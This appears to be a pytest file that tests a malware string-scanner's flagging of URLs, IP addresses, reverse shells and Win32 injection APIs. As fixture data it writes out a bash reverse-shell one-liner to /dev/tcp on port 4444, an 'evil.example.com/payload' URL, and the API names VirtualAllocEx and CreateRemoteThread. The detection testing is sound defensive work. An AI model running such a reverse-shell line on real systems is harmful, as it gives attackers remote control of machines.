"""String extraction and flagging tests."""

from pathlib import Path

from crucible.static.strings import analyze


def test_analyze_flags_url_and_ip(tmp_path: Path) -> None:
    target = tmp_path / "sample.bin"
    target.write_bytes(
        b"harmless prefix\x00\x00"
        b"connect to http://evil.example.com/payload now\x00"
        b"IP 10.0.0.5 is boring\x00"
    )
    findings = analyze(target)
    assert any("http://evil.example.com" in s for s in findings.flagged.get("url", []))
    assert any("10.0.0.5" in s for s in findings.flagged.get("ipv4", []))


def test_analyze_flags_reverse_shell(tmp_path: Path) -> None:
    target = tmp_path / "rev.sh"
    target.write_bytes(b"bash -i >& /dev/tcp/192.168.1.1/4444 0>&1\n")
    findings = analyze(target)
    assert findings.flagged.get("reverse_shell")
    assert any("192.168.1.1" in s for s in findings.flagged.get("ipv4", []))


def test_analyze_flags_win32_apis(tmp_path: Path) -> None:
    target = tmp_path / "pe_like.bin"
    target.write_bytes(
        b"kernel32.dll\x00VirtualAllocEx\x00CreateRemoteThread\x00LoadLibraryA\x00"
    )
    findings = analyze(target)
    api_hits = findings.flagged.get("suspicious_api", [])
    assert "VirtualAllocEx" in api_hits
    assert "CreateRemoteThread" in api_hits


def test_analyze_handles_utf16le_strings(tmp_path: Path) -> None:
    target = tmp_path / "wide.bin"
    # Wide string for an API name plus some padding.
    wide = "VirtualAlloc".encode("utf-16-le")
    target.write_bytes(b"\x00\x00" + wide + b"\x00\x00")
    findings = analyze(target)
    assert any("VirtualAlloc" in s for s in findings.flagged.get("suspicious_api", []))
